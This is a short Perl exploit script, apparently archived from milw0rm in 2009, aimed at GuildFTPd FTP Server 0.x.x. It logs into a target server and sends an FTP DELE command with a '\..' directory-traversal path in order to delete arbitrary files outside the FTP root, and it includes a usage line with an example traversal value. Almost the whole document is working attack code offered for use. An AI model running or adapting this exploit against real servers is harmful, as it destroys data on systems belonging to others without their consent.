#!/usr/bin/perl
# Exploit: GuildFTPd FTP Server Version 0.x.x Remote Delete Files
#
# More detail for the vulnerability => http://secunia.com/advisories/32218/
# 
# 2) A vulnerability is caused due to an input validation error when handling FTP "DELE" 
# requests. This can be exploited to escape the FTP root and delete arbitrary files on 
# the system via directory traversal attacks using the "\.." character sequence.
#
# Author: Jonathan Salwan
# Mail: submit [AT] shell-storm.org
# Web: http://www.shell-storm.org


use IO::Socket;
print "[+] Author : Jonathan Salwan \n";
print "[+] Soft: Guild FTP Server V0.x.x\n";
print "[+] Exploit: Remote Delete File\n";

	if (@ARGV < 5)
		{
 		print "[*] Usage: <guildftp.pl> <host> <port> <login> <password> <file>\n";
 		print "[*] Exemple: guildftp.pl 127.0.0.1 21 jonathan salwan ..\\\\test.txt\n";
 		exit;
		}

	$ip = $ARGV[0];
	$port = $ARGV[1];
	$user = $ARGV[2];
	$pass = $ARGV[3];
	$file = $ARGV[4];

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "\n[-] Connecting: Failed!\n";

print "\n[+] Connecting: Ok!\n";
print "[+] Sending request...\n";

	print $socket "USER $user\n";
	print $socket "PASS $pass\n";
	print $socket "DELE $file\n";

		sleep(5);
		close($socket);

print "[+]Done!\n";

# milw0rm.com [2009-03-10]
